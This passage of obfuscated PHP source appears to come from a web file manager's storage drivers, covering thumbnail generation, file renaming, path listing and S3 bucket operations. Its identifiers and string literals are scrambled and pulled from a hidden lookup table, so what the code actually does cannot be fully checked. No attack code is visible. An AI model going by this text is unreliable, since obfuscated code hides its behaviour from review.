$­ñÒÜ = isset($GLOBALS[$¾ùÀĞ¼[183]]) ? $GLOBALS[$¾ùÀĞ¼[183]] : array(); if ($­ñÒÜ && $­ñÒÜ[$¾ùÀĞ¼[184]] == $Àôê…š”[$¾ùÀĞ¼[87]]) { $Àôê…š” = $­ñÒÜ; $¨Ë«ÓĞˆ = $Àôê…š”[$¾ùÀĞ¼[185]]; if ($¨Ë«ÓĞˆ && isset($¨Ë«ÓĞˆ[$¾ùÀĞ¼[186]])) { if ($¨Ë«ÓĞˆ[$¾ùÀĞ¼[186]] <= $ßÀô‰â‚ && $¨Ë«ÓĞˆ[$¾ùÀĞ¼[187]] <= $ßÀô‰â‚) { $Â–¬ú…” = !0; } } } if ($Àôê…š”[$¾ùÀĞ¼[79]] <= 1024 * 50 || $Â–¬ú…” || !function_exists($¾ùÀĞ¼[188]) || $Àôê…š”[$¾ùÀĞ¼[169]] == $¾ùÀĞ¼[189]) { return $this->fileOut($á˜æ´ÓÎ, !1, $Àôê…š”[$¾ùÀĞ¼[32]]); } $€†¯î±ş = kodIO::hashPath($Àôê…š”); $ùÆğÖì· = "\143\x6f\166\x65\162\137{$€†¯î±ş}\137{$ßÀô‰â‚}\x2e\160\x6e\147"; $ØÓĞ®Ù¢ = IO_PATH_SYSTEM_TEMP . $¾ùÀĞ¼[190]; $îô‰´› = IO::infoFullSimple($ØÓĞ®Ù¢); $Ñ ‚éŞ = $îô‰´› && is_array($îô‰´›) ? $îô‰´›[$¾ùÀĞ¼[87]] : $¾ùÀĞ¼[12]; if (!$Ñ ‚éŞ) { $Ñ ‚éŞ = IO::mkdir($ØÓĞ®Ù¢); } if ($Àôê…š”[$¾ùÀĞ¼[191]] == $¾ùÀĞ¼[192] && isset($Àôê…š”[$¾ùÀĞ¼[193]]) && $Àôê…š”[$¾ùÀĞ¼[193]] == kodIO::sourceID($Ñ ‚éŞ)) { $æşĞï = $Àôê…š”[$¾ùÀĞ¼[194]]; if ($ßÀô‰â‚ <= 500) { $úİ²ˆÌú = preg_replace($¾ùÀĞ¼[195], $¾ùÀĞ¼[196], $Àôê…š”[$¾ùÀĞ¼[32]]); $æşĞï = IO::fileNameExist($Ñ ‚éŞ, $úİ²ˆÌú); } return IO::fileOut(KodIO::make($æşĞï), !1, $Àôê…š”[$¾ùÀĞ¼[32]]); } $Ñõ²¶ëĞ = IO::fileNameExist($Ñ ‚éŞ, $ùÆğÖì·); if ($Ñõ²¶ëĞ) { return IO::fileOut(KodIO::make($Ñõ²¶ëĞ), !1, $Àôê…š”[$¾ùÀĞ¼[32]]); } if ($ßÀô‰â‚ > 1000) { $this->makeImageCover($Ñ ‚éŞ, $á˜æ´ÓÎ, $ùÆğÖì·, $ßÀô‰â‚); $this->makeImageCover($Ñ ‚éŞ, $á˜æ´ÓÎ, "\x63\x6f\166\x65\162\x5f{$€†¯î±ş}\x5f\x32\x35\x30\x2e\x70\x6e\147", 250); $Ñõ²¶ëĞ = IO::fileNameExist($Ñ ‚éŞ, $ùÆğÖì·); if ($Ñõ²¶ëĞ) { return IO::fileOut(KodIO::make($Ñõ²¶ëĞ), !1, $Àôê…š”[$¾ùÀĞ¼[32]]); } die; } if (!kodIO::allowCover($Àôê…š”)) { return $this->fileOut($á˜æ´ÓÎ, !1, $Àôê…š”[$¾ùÀĞ¼[32]]); } $ôü§©Çâ = Cache::get($ùÆğÖì·); if ($ôü§©Çâ == $¾ùÀĞ¼[197] || $ôü§©Çâ == $¾ùÀĞ¼[198]) { echo $ôü§©Çâ; die; } Cache::set($ùÆğÖì·, $¾ùÀĞ¼[198], 60); $÷ôğĞ¥ş = array($Ñ ‚éŞ, $Àôê…š”[$¾ùÀĞ¼[87]], $ùÆğÖì·, $ßÀô‰â‚); $Â¦ì¶ = $¾ùÀĞ¼[199] . $Àôê…š”[$¾ùÀĞ¼[79]] . $¾ùÀĞ¼[200] . $ùÆğÖì· . $¾ùÀĞ¼[201] . $Àôê…š”[$¾ùÀĞ¼[32]] . $¾ùÀĞ¼[202] . $Àôê…š”[$¾ùÀĞ¼[87]]; TaskQueue::add($¾ùÀĞ¼[203], $÷ôğĞ¥ş, $Â¦ì¶, $ùÆğÖì·); } public function makeImageCover($ù ˜“Îñ, $Ã¤Ğ›õı, $Ğ±üùØ÷, $ú¾ïÚõ³) { $ÖêºÊ÷ =& $_SERVER[ùèÅ´Ãš]; if (IO::fileNameExist($ù ˜“Îñ, $Ğ±üùØ÷)) { return $ÖêºÊ÷[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ş…ñíº = $this->getPathOuter($Ã¤Ğ›õı); $™¯„øü¢ = DATA_THUMB . $Ğ±üùØ÷; del_file($™¯„øü¢); $Á†‰ƒ½ = IO::copy($Ş…ñíº, TEMP_FILES, !1, $Ğ±üùØ÷); if (!@file_exists($Á†‰ƒ½)) { return $ÖêºÊ÷[205]; } ImageThumb::createThumb($Á†‰ƒ½, $™¯„øü¢, $ú¾ïÚõ³, $ú¾ïÚõ³ * 10); if (@file_exists($™¯„øü¢)) { Cache::remove($Ğ±üùØ÷); return IO::move($™¯„øü¢, $ù ˜“Îñ); } Cache::set($Ğ±üùØ÷, $ÖêºÊ÷[197], 600); del_file($™¯„øü¢); return $ÖêºÊ÷[206] . $Á†‰ƒ½ . $ÖêºÊ÷[74]; } public function fileOutImageServer($®ı¥áÍú, $òª½Õ‡İ = 250) { $this->fileOutImage($®ı¥áÍú, $òª½Õ‡İ); } public function fileNameAuto($¤†«ı•×, $áí¦Âš§, $×Ûé”ô« = REPEAT_RENAME, $Æçîúûã = false) { $¢¸ß½†Ê =& $_SERVER[ùèÅ´Ãš]; $ì„™‚¡• = $¤†«ı•× === $¢¸ß½†Ê[12] ? $áí¦Âš§ : rtrim($¤†«ı•×, $¢¸ß½†Ê[8]) . $¢¸ß½†Ê[8] . $áí¦Âš§; if ($×Ûé”ô« == REPEAT_REPLACE || !$this->exist($ì„™‚¡•) || $Æçîúûã && $×Ûé”ô« != REPEAT_RENAME_FOLDER) { return $áí¦Âš§; } if ($×Ûé”ô« == REPEAT_SKIP) { return !1; } $ï¼ãšÙñ = $¢¸ß½†Ê[10] . get_path_ext($áí¦Âš§); $ï¼ãšÙñ = $ï¼ãšÙñ == $¢¸ß½†Ê[10] || $Æçîúûã ? $¢¸ß½†Ê[12] : $ï¼ãšÙñ; $•¦³åûö = 1; $ªÆÌˆá­ = substr($áí¦Âš§, 0, strlen($áí¦Âš§) - strlen($ï¼ãšÙñ)); $ÅëÁÏ›  = $ªÆÌˆá­ . "\50{$•¦³åûö}\51{$ï¼ãšÙñ}"; while ($this->exist(rtrim($¤†«ı•×, $¢¸ß½†Ê[8]) . $¢¸ß½†Ê[8] . $ÅëÁÏ› )) { $ÅëÁÏ›  = $ªÆÌˆá­ . "\50{$•¦³åûö}\51{$ï¼ãšÙñ}"; $•¦³åûö++; } return $ÅëÁÏ› ; } private function fileNameAutoList($Äß¥¦à, $°Ûçó²Ë, $ÀóûÉ…× = false) { $İ¬³š€ =& $_SERVER[ùèÅ´Ãš]; $ÙÀ¯íá… = $this->listPath($Äß¥¦à, !0); $ÙÀ¯íá… = array_merge($ÙÀ¯íá…[$İ¬³š€[85]], $ÙÀ¯íá…[$İ¬³š€[86]]); $‡Ïûñˆ = array_to_keyvalue($ÙÀ¯íá…, $İ¬³š€[12], $İ¬³š€[32]); $Á½·Ë­Õ = $İ¬³š€[10] . get_path_ext($°Ûçó²Ë); $Á½·Ë­Õ = $Á½·Ë­Õ == $İ¬³š€[10] || $ÀóûÉ…× ? $İ¬³š€[12] : $Á½·Ë­Õ; $¯ûçå• = substr($°Ûçó²Ë, 0, strlen($°Ûçó²Ë) - strlen($Á½·Ë­Õ)); $‹Şø· = $¯ûçå• . "\x28\60\51{$Á½·Ë­Õ}"; for ($¢óİ…öù = 1; $¢óİ…öù <= count($‡Ïûñˆ) + 1; $¢óİ…öù++) { $‹Şø· = $¯ûçå• . "\x28{$¢óİ…öù}\x29{$Á½·Ë­Õ}"; if (!in_array_not_case($‹Şø·, $‡Ïûñˆ)) { return $‹Şø·; } } return $‹Şø·; } public function listAllFiles($ºåí‹, $ú¯­ç‚) { $åºÆ¶† =& $_SERVER[ùèÅ´Ãš]; if (empty($ú¯­ç‚)) { return array(); } $Ç²‚• = array_keys($ú¯­ç‚); $æã „·Š = array(); $ºåí‹ = trim($ºåí‹, $åºÆ¶†[8]); foreach ($ú¯­ç‚ as $º¨Ù ä => $÷ûüÆ½§) { $ûıÉ¡‚õ = ltrim(substr(trim($º¨Ù ä, $åºÆ¶†[8]), strlen($ºåí‹)), $åºÆ¶†[8]); if (substr($º¨Ù ä, -1) == $åºÆ¶†[8]) { $ûıÉ¡‚õ = rtrim($ûıÉ¡‚õ, $åºÆ¶†[8]) . $åºÆ¶†[8]; } $æã „·Š = array_merge($æã „·Š, $this->slicePath($ûıÉ¡‚õ)); } $£Å“İ–« = array(); foreach (array_unique($æã „·Š) as $ú¤öì‹â) { $“ÏèëÕé = array($åºÆ¶†[87] => $this->getPathOuter($åºÆ¶†[8] . $ºåí‹ . $åºÆ¶†[8] . $ú¤öì‹â), $åºÆ¶†[78] => 1, $åºÆ¶†[79] => 0); if (substr($ú¤öì‹â, -1) != $åºÆ¶†[8]) { $“ÏèëÕé[$åºÆ¶†[78]] = 0; $ıĞ˜½ = $this->getPath($ºåí‹ . $åºÆ¶†[8] . $ú¤öì‹â); if (isset($ú¯­ç‚[$ıĞ˜½])) { $¿ÔşÌè = $ú¯­ç‚[$ıĞ˜½]; if (isset($¿ÔşÌè[$åºÆ¶†[79]])) { $“ÏèëÕé[$åºÆ¶†[79]] = intval($¿ÔşÌè[$åºÆ¶†[79]]); } if (isset($¿ÔşÌè[$åºÆ¶†[207]])) { $“ÏèëÕé[$åºÆ¶†[88]] = intval($¿ÔşÌè[$åºÆ¶†[207]]); } } } $£Å“İ–«[] = $“ÏèëÕé; } return $£Å“İ–«; } public function slicePath($ø‰øó·Í) { $¢öóì± =& $_SERVER[ùèÅ´Ãš]; $ÔÔçü¯Ù = explode($¢öóì±[8], trim($ø‰øó·Í, $¢öóì±[8])); $¬Ğ˜ÚØ§ = 0; do { ++$¬Ğ˜ÚØ§; $æ¿Ó¨şÚ[] = implode($¢öóì±[8], array_slice($ÔÔçü¯Ù, 0, $¬Ğ˜ÚØ§)) . $¢öóì±[8]; } while ($¬Ğ˜ÚØ§ < count($ÔÔçü¯Ù)); $æ¿Ó¨şÚ[count($ÔÔçü¯Ù) - 1] = $ø‰øó·Í; return $æ¿Ó¨şÚ; } public function getHost() { $Ë÷—¾ =& $_SERVER[ùèÅ´Ãš]; $«óí¹ûæ = parse_url(trim($this->domain, $Ë÷—¾[8])); $ˆ¾ÍÛñ’ = isset($«óí¹ûæ[$Ë÷—¾[208]]) ? $«óí¹ûæ[$Ë÷—¾[208]] : http_type(); $¦×Ãü¨° = isset($«óí¹ûæ[$Ë÷—¾[209]]) ? $«óí¹ûæ[$Ë÷—¾[209]] : $«óí¹ûæ[$Ë÷—¾[87]]; if (isset($«óí¹ûæ[$Ë÷—¾[210]])) { $¦×Ãü¨° .= $Ë÷—¾[4] . $«óí¹ûæ[$Ë÷—¾[210]]; } return $ˆ¾ÍÛñ’ . $Ë÷—¾[211] . $¦×Ãü¨°; } public function pathEncode($¸ÌÏŸ‹Ì) { $±€¨çÜ‘ =& $_SERVER[ùèÅ´Ãš]; return str_replace($±€¨çÜ‘[212], $±€¨çÜ‘[8], rawurlencode($¸ÌÏŸ‹Ì)); } public function writeLog($·£¨øì = '', $ù‹ÏØƒı = false) { $¨ëÌÎ‹ =& $_SERVER[ùèÅ´Ãš]; $‘Í°Ü£° = in_array(ACTION, array($¨ëÌÎ‹[213], $¨ëÌÎ‹[214])); if (!$‘Í°Ü£° && !GLOBAL_DEBUG) { return; } $ß…²‰ì = $·£¨øì; static $õ—ÈÎÍ = null; if (!$õ—ÈÎÍ) { $õ—ÈÎÍ = strtoupper($this->getType()); } $·£¨øì = $õ—ÈÎÍ . $¨ëÌÎ‹[215] . $·£¨øì; if ($ù‹ÏØƒı) { $ƒ²Â¼ØÜ = error_get_last(); if ($ƒ²Â¼ØÜ) { $·£¨øì = array($·£¨øì, $ƒ²Â¼ØÜ); } } write_log($·£¨øì, $¨ëÌÎ‹[216]); if ($‘Í°Ü£°) { throw new Exception($ß…²‰ì); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ãÄúÚˆ) { set_timeout(); require_once SDK_DIR . $_SERVER[ùèÅ´Ãš][217]; parent::__construct(); $this->_init($ãÄúÚˆ); } public function _init($µ‚á¸é˜) { $¿«ë•«Ê =& $_SERVER[ùèÅ´Ãš]; $this->config = $µ‚á¸é˜; foreach ($µ‚á¸é˜ as $É‚úÓà± => $öáÛ¥·ï) { if (isset($this->{$É‚úÓà±})) { $this->{$É‚úÓà±} = $öáÛ¥·ï; } } $this->endpoint = $µ‚á¸é˜[$¿«ë•«Ê[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ÅıÎË‘ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ÅıÎË‘, 0, 7) == $¿«ë•«Ê[219]) { $ÅıÎË‘ = $¿«ë•«Ê[220] . substr($ÅıÎË‘, 7); } $this->client->setEndpoint($ÅıÎË‘); if (in_array(ACTION, array($¿«ë•«Ê[213], $¿«ë•«Ê[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ ÍÏ¾æª = "\166\64") { $this->signVer = $ ÍÏ¾æª; $this->client->setSignVersion($ ÍÏ¾æª); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $úô‰·¶) { return null; } } public function isBucketCors() { $û‡‰è² =& $_SERVER[ùèÅ´Ãš]; $õ‹…éè³ = $this->getBucketCors(); if (!$õ‹…éè³ || !is_array($õ‹…éè³)) { return !1; } if (!is_array($õ‹…éè³[$û‡‰è²[221]])) { $õ‹…éè³[$û‡‰è²[221]] = explode($û‡‰è²[50], $õ‹…éè³[$û‡‰è²[221]]); } if ($õ‹…éè³[$û‡‰è²[222]] != $û‡‰è²[223] || !in_array($û‡‰è²[223], $õ‹…éè³[$û‡‰è²[221]])) { return !1; } $›õÆğ™ò = array_map($û‡‰è²[224], $õ‹…éè³[$û‡‰è²[225]]); if (!is_array($›õÆğ™ò)) { $›õÆğ™ò = array(); } $ŒÇĞ‘ëá = array($û‡‰è²[226], $û‡‰è²[227], $û‡‰è²[228], $û‡‰è²[229], $û‡‰è²[230]); $Ùµ±”îÆ = array_diff($ŒÇĞ‘ëá, $›õÆğ™ò); return empty($Ùµ±”îÆ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($î£¾ºôã, $ö‘è¸™ = '', $­±ÃßÒ = REPEAT_RENAME) { $åç¶ÚÖ× = $this->setContent($î£¾ºôã, $ö‘è¸™); if ($åç¶ÚÖ× !== !1) { return $this->getPathOuter($î£¾ºôã); } return !1; } public function mkdir($½ñ„Î€¹, $Î›‹İ¡² = REPEAT_SKIP) { $ªßá®ğ =& $_SERVER[ùèÅ´Ãš]; if (empty($½ñ„Î€¹) && $½ñ„Î€¹ !== $ªßá®ğ[231]) { return !1; } if ($Î›‹İ¡² && $this->_isFolder($½ñ„Î€¹)) { return $this->getPathOuter($½ñ„Î€¹); } $º¤ƒÈÀß = $this->setContent($½ñ„Î€¹, $ªßá®ğ[12], !0); if ($º¤ƒÈÀß !== !1) { return $this->getPathOuter($½ñ„Î€¹); } return !1; } public function copyFile($“æÖÚ, $ğİòúµü, $´£ªÀéË = array()) { $ñ­›»í  =& $_SERVER[ùèÅ´Ãš]; $šº©àç = $this->objectMeta($“æÖÚ); if (!$šº©àç) { return !1; } if ($šº©àç[$ñ­›»í [79]] <= 1024 * 1024 * 200) { $Ô‰×û• = $this->client->copyObject($this->bucket, $“æÖÚ, $this->bucket, $ğİòúµü, $ñ­›»í [232], $´£ªÀéË); } else { $Ô‰×û• = $this->client->multiCopyObject($this->bucket, $“æÖÚ, $this->bucket, $ğİòúµü, $´£ªÀéË); } $Ô‰×û• = $Ô‰×û• ? $this->getPathOuter($ğİòúµü) : !1; return $Ô‰×û•; } public function moveFile($²¼°†, $–£€ÒÙü) { if ($this->copyFile($²¼°†, $–£€ÒÙü)) { $this->delFile($²¼°†); return $this->getPathOuter($–£€ÒÙü); } return !1; } public function delFile($¬É¡ŸÖá) { return $this->client->deleteObject($this->bucket, $¬É¡ŸÖá); } public function delFolder($µ‹¤­Ûğ) { $èôùòº =& $_SERVER[ùèÅ´Ãš]; if (!$this->exist($µ‹¤­Ûğ)) { return !0; } $this->listItemCache = !1; $‡Í•ÉÕš = $this->fileList($µ‹¤­Ûğ); $this->listItemCache = !0; $Œ§ıÜ‚¨ = trim($µ‹¤­Ûğ, $èôùòº[8]) . $èôùòº[8]; if (!empty($µ‹¤­Ûğ) && $µ‹¤­Ûğ !== $èôùòº[231] && !in_array($Œ§ıÜ‚¨, $‡Í•ÉÕš[$èôùòº[85]])) { $‡Í•ÉÕš[$èôùòº[85]][] = $Œ§ıÜ‚¨; } $¯İˆ£Ş  = $this->delByBatch($‡Í•ÉÕš[$èôùòº[86]]); if (!$¯İˆ£Ş ) { return !1; } $¯İˆ£Ş  = $this->delByBatch($‡Í•ÉÕš[$èôùòº[85]]); if (!$¯İˆ£Ş ) { return !1; } return $this->delFile($Œ§ıÜ‚¨); } private function delByBatch($Í†ı§…˜) { foreach (array_chunk($Í†ı§…˜, 1000) as $ôĞ˜£ÀŒ) { $ÊûËÉßÍ = $this->client->deleteObjects($this->bucket, $ôĞ˜£ÀŒ); if (!$ÊûËÉßÍ) { return !1; } } return !0; } public function rename($ …°Œ­ì, $ö×æÙ¹È) { return $this->renameObject($ …°Œ­ì, $ö×æÙ¹È); } public function listPath($Ãè“¼¾¿, $§œÏ¼â½ = false) { $ôÙÉÒË =& $_SERVER[ùèÅ´Ãš]; $êüÌ¤¥¬ = $this->fileList($Ãè“¼¾¿, $ôÙÉÒË[8], !0); foreach ($êüÌ¤¥¬[$ôÙÉÒË[85]] as $•‡ «³¦ => $¾õ¨ĞÂ) { $êüÌ¤¥¬[$ôÙÉÒË[85]][$•‡ «³¦] = $this->folderInfo($¾õ¨ĞÂ, $§œÏ¼â½, $¾õ¨ĞÂ); } foreach ($êüÌ¤¥¬[$ôÙÉÒË[86]] as $•‡ «³¦ => $¾õ¨ĞÂ) { $êüÌ¤¥¬[$ôÙÉÒË[86]][$•‡ «³¦] = $this->fileInfo($¾õ¨ĞÂ[$ôÙÉÒË[32]], $§œÏ¼â½, $¾õ¨ĞÂ); } return $êüÌ¤¥¬; } protected function infoChildren($ıâ¿ü , &$Ö›ä¤–±) { $Ş§ÙêÌü =& $_SERVER[ùèÅ´Ãš]; $¢¾¢± = $this->fileList($ıâ¿ü , $Ş§ÙêÌü[12], !0); $Ö›ä¤–±[$Ş§ÙêÌü[81]] += count($¢¾¢±[$Ş§ÙêÌü[85]]); $Ö›ä¤–±[$Ş§ÙêÌü[80]] += count($¢¾¢±[$Ş§ÙêÌü[86]]); foreach ($¢¾¢±[$Ş§ÙêÌü[86]] as $úÔí’ä) { if (!$úÔí’ä || !$úÔí’ä[$Ş§ÙêÌü[79]]) { continue; } $Ö›ä¤–±[$Ş§ÙêÌü[79]] += $úÔí’ä[$Ş§ÙêÌü[79]]; } } private function fileInfo($ÇËúÖù™, $Ìì¥İıÅ = false, $ú´…Í•‘ = array()) { $áˆ€†Ìí =& $_SERVER[ùèÅ´Ãš]; $ÕŞõ«Ïì = array($áˆ€†Ìí[32] => $this->pathThis($ÇËúÖù™), $áˆ€†Ìí[87] => $this->getPathOuter($ÇËúÖù™), $áˆ€†Ìí[33] => $áˆ€†Ìí[233], $áˆ€†Ìí[169] => $this->ext($ÇËúÖù™), $áˆ€†Ìí[79] => isset($ú´…Í•‘[$áˆ€†Ìí[79]]) ? $ú´…Í•‘[$áˆ€†Ìí[79]] : 0); if ($Ìì¥İıÅ) { return $ÕŞõ«Ïì; } $ÕŞõ«Ïì[$áˆ€†Ìí[234]] = $ÕŞõ«Ïì[$áˆ€†Ìí[88]] = 0; $ÕŞõ«Ïì[$áˆ€†Ìí[235]] = $ÕŞõ«Ïì[$áˆ€†Ìí[236]] = !0; if (empty($ú´…Í•‘)) { $ú´…Í•‘ = $this->objectMeta($ÇËúÖù™); if (!$ú´…Í•‘) { return $ÕŞõ«Ïì; } } if (isset($ú´…Í•‘[$áˆ€†Ìí[237]]) && $ú´…Í•‘[$áˆ€†Ìí[237]]) { $ÕŞõ«Ïì[$áˆ€†Ìí[238]] = $ú´…Í•‘[$áˆ€†Ìí[237]]; } if (isset($ú´…Í•‘[$áˆ€†Ìí[207]])) { $ÕŞõ«Ïì[$áˆ€†Ìí[88]] = $ú´…Í•‘[$áˆ€†Ìí[207]]; } if (isset($ú´…Í•‘[$áˆ€†Ìí[79]])) { $ÕŞõ«Ïì[$áˆ€†Ìí[79]] = $ú´…Í•‘[$áˆ€†Ìí[79]]; } return $ÕŞõ«Ïì; } private function folderInfo($ñ‰ë±¨, $èïÌÈ† = false, $æŒ¿Õ‘â = array()) { $è·‚ı€Ä =& $_SERVER[ùèÅ´Ãš]; $˜ƒî÷¯ñ = array($è·‚ı€Ä[32] => $this->pathThis($ñ‰ë±¨), $è·‚ı€Ä[87] => $this->getPathOuter($è·‚ı€Ä[8] . $ñ‰ë±¨), $è·‚ı€Ä[33] => $è·‚ı€Ä[78]); if ($èïÌÈ†) { return $˜ƒî÷¯ñ; } $˜ƒî÷¯ñ[$è·‚ı€Ä[234]] = $˜ƒî÷¯ñ[$è·‚ı€Ä[88]] = 0; $˜ƒî÷¯ñ[$è·‚ı€Ä[235]] = $˜ƒî÷¯ñ[$è·‚ı€Ä[236]] = !0; if ($ñ‰ë±¨ == $è·‚ı€Ä[12]) { return $˜ƒî÷¯ñ; } if (empty($æŒ¿Õ‘â)) { $æŒ¿Õ‘â = $this->objectMeta(trim($ñ‰ë±¨, $è·‚ı€Ä[8]) . $è·‚ı€Ä[8]); } if (isset($æŒ¿Õ‘â[$è·‚ı€Ä[207]])) { $˜ƒî÷¯ñ[$è·‚ı€Ä[234]] = $æŒ¿Õ‘â[$è·‚ı€Ä[207]]; } return $˜ƒî÷¯ñ; } private function fileList($şÏşã¨Ü, $–êØÏ = '', $¡ş‘ÉÀá = 0) { $‚õò”© =& $_SERVER[ùèÅ´Ãš]; $¾€àö¯Ì = rtrim($şÏşã¨Ü, $‚õò”©[8]) . $‚õò”©[8]; $ÕæÜÎ© = $this->listObjs($¾€àö¯Ì, null, null, $–êØÏ); if (!$ÕæÜÎ©) { return array($‚õò”©[85] => array(), $‚õò”©[86] => array()); } $Ïíûí– = $µñ¶ĞîÉ = array(); foreach ($ÕæÜÎ©[$‚õò”©[239]] as $«â«ì…) { $œÏÁ…²¼ = $«â«ì…[$‚õò”©[32]]; if ($œÏÁ…²¼ == $¾€àö¯Ì) { continue; } $æ²šú = isset($«â«ì…[$‚õò”©[79]]) ? $«â«ì…[$‚õò”©[79]] : 0; $ú®’Üó• = $æ²šú == 0 && substr($œÏÁ…²¼, strlen($œÏÁ…²¼) - 1, 1) == $‚õò”©[8] ? !0 : !1; $this->cacheMethodInfoSet($œÏÁ…²¼, $ú®’Üó•, $«â«ì…); if ($ú®’Üó•) { $Ïíûí–[] = $œÏÁ…²¼; continue; } $µñ¶ĞîÉ[] = $¡ş‘ÉÀá ? $«â«ì… : $œÏÁ…²¼; } foreach ($ÕæÜÎ©[$‚õò”©[240]] as $«â«ì…) { $Ïíûí–[] = $«â«ì…[$‚õò”©[32]]; $this->cacheMethodInfoSet($«â«ì…[$‚õò”©[32]], !0); } $this->cacheMethodInfoSet($şÏşã¨Ü, !0); return array($‚õò”©[85] => $Ïíûí–, $‚õò”©[86] => $µñ¶ĞîÉ); } private function listObjs($ÈöàÍËÛ, $ ­ÜÙö” = null, $ùÃ§×ûà = null, $İ­§‚×µ = null) { $ó¹®ªüü =& $_SERVER[ùèÅ´Ãš]; $ÈöàÍËÛ = trim($ÈöàÍËÛ, $ó¹®ªüü[8]); $ö›ãÈ„¯ = empty($ÈöàÍËÛ) && $ÈöàÍËÛ !== $ó¹®ªüü[231] ? $ó¹®ªüü[12] : $ÈöàÍËÛ . $ó¹®ªüü[8]; return $this->client->getBucket($this->bucket, $ö›ãÈ„¯, $ ­ÜÙö”, $ùÃ§×ûà, $İ­§‚×µ, !0); } public function has($òÂè¾ì§, $Üç´ = false, $ôÊ¥©Ê  = true) { $ú‡ôœâ =& $_SERVER[ùèÅ´Ãš]; $òÂè¾ì§ = trim($òÂè¾ì§, $ú‡ôœâ[8]); $õô­ÜıÈ = empty($òÂè¾ì§) && $òÂè¾ì§ !== $ú‡ôœâ[231] ? $ú‡ôœâ[12] : $òÂè¾ì§ . $ú‡ôœâ[8]; $±ÛÖÎÕ = null; $òãÚ¥å· = 500; $ğèò±ìŒ = $ú‡ôœâ[8]; $‰¯‘²‡ = $½Â‰›Ë· = array(); while (!0) { $ÛÛ‡éí = $this->listObjs($òÂè¾ì§, $±ÛÖÎÕ, $òãÚ¥å·, $ğèò±ìŒ); if (!$ÛÛ‡éí) { break; } $±ÛÖÎÕ = $ÛÛ‡éí[$ú‡ôœâ[241]]; $ÃóŒÚ = $ÛÛ‡éí[$ú‡ôœâ[239]]; $Ù¡¦Ã—ˆ = $ÛÛ‡éí[$ú‡ôœâ[240]]; if (empty($ÃóŒÚ) && empty($Ù¡¦Ã—ˆ)) { break; } if (count($ÃóŒÚ) == 1 && $ÃóŒÚ[0][$ú‡ôœâ[32]] == $õô­ÜıÈ) { break; } if ($Üç´) { if (count($ÃóŒÚ)) { $ÃóŒÚ = array_column($ÃóŒÚ, $ú‡ôœâ[32]); $‰¯‘²‡ = array_merge($‰¯‘²‡, $ÃóŒÚ); } if (count($Ù¡¦Ã—ˆ)) { $Ù¡¦Ã—ˆ = array_column($Ù¡¦Ã—ˆ, $ú‡ôœâ[32]); $½Â‰›Ë· = array_merge($½Â‰›Ë·, $Ù¡¦Ã—ˆ); } if ($±ÛÖÎÕ === null) { break; } continue; } if ($ôÊ¥©Ê ) { if (!empty($ÃóŒÚ)) { if (count($ÃóŒÚ) > 1 || isset($ÃóŒÚ[0][$ú‡ôœâ[32]]) && $ÃóŒÚ[0][$ú‡ôœâ[32]] != $õô­ÜıÈ) { return !0; } } } else { if (!empty($Ù¡¦Ã—ˆ)) { return !0; } } if ($±ÛÖÎÕ === null) { break; } } if ($Üç´) { $‰¯‘²‡ = array_diff($‰¯‘²‡, array($õô­ÜıÈ)); $‰¯‘²‡ = count(array_unique($‰¯‘²‡)); $½Â‰›Ë· = count(array_unique($½Â‰›Ë·)); return array($ú‡ôœâ[242] => $‰¯‘²‡, $ú‡ôœâ[243] => $½Â‰›Ë·); } return !1; } public function listAll($ñıé¾œ) { $”›­·ƒ¶ =& $_SERVER[ùèÅ´Ãš]; $âÂŒßŸ = $this->fileList($ñıé¾œ, $”›­·ƒ¶[12], !0); $¬Üõ›® = array_to_keyvalue($âÂŒßŸ[$”›­·ƒ¶[86]], $”›­·ƒ¶[32]); foreach ($âÂŒßŸ[$”›­·ƒ¶[85]] as $¢®ç®§°) { if (is_string($¢®ç®§°)) { $¬Üõ›®[$¢®ç®§°] = array($”›­·ƒ¶[79] => 0); } } return $this->listAllFiles($ñıé¾œ, $¬Üõ›®); } public function canRead($¤Ğº•æà) { $îü­Üùò =& $_SERVER[ùèÅ´Ãš]; $½Ë¦ÄœŠ = $this->client->getAccessControlPolicy($this->bucket, $¤Ğº•æà); if (!$½Ë¦ÄœŠ) { return !1; } return in_array($½Ë¦ÄœŠ, array($îü­Üùò[244], $îü­Üùò[245], $îü­Üùò[246])) ? !0 : !1; } public function canWrite($÷úËÈı) { $â¾ÈÊôˆ =& $_SERVER[ùèÅ´Ãš]; $ÑÑâíŞ˜ = $this->client->getAccessControlPolicy($this->bucket, $÷úËÈı); if (!$ÑÑâíŞ˜) { return !1; } return in_array($ÑÑâíŞ˜, array($â¾ÈÊôˆ[244], $â¾ÈÊôˆ[245])) ? !0 : !1; } public function getContent($Â÷‚†©·) { return $this->client->getObject($this->bucket, $Â÷‚†©·); } public function setContent($¿¡ï²ŒÙ, $Ãå“êÏ° = '', $ğ¦†×š = false) { $Ñ§´®Ì› =& $_SERVER[ùèÅ´Ãš]; $¿¡ï²ŒÙ = $ğ¦†×š ? trim($¿¡ï²ŒÙ, $Ñ§´®Ì›[8]) . $Ñ§´®Ì›[8] : $¿¡ï²ŒÙ; $’Ö = get_file_mime(get_path_ext($¿¡ï²ŒÙ)); $ğ‰¿ÄêÖ = $this->client->putObject($Ãå“êÏ°, $this->bucket, $¿¡ï²ŒÙ, $Ñ§´®Ì›[232], array(), $’Ö); if (!$ğ‰¿ÄêÖ) { return !1; } if ($ğ¦†×š) { return !0; } return $ğ‰¿ÄêÖ ? !0 : !1; } public function fileSubstr($õìÉìØ¡, $´äõáÓÊ, $Ééû©Ëª) { $ƒ‡ıßÔâ = $´äõáÓÊ + $Ééû©Ëª - 1; return $this->client->getObject($this->bucket, $õìÉìØ¡, array($_SERVER[ùèÅ´Ãš][247] => 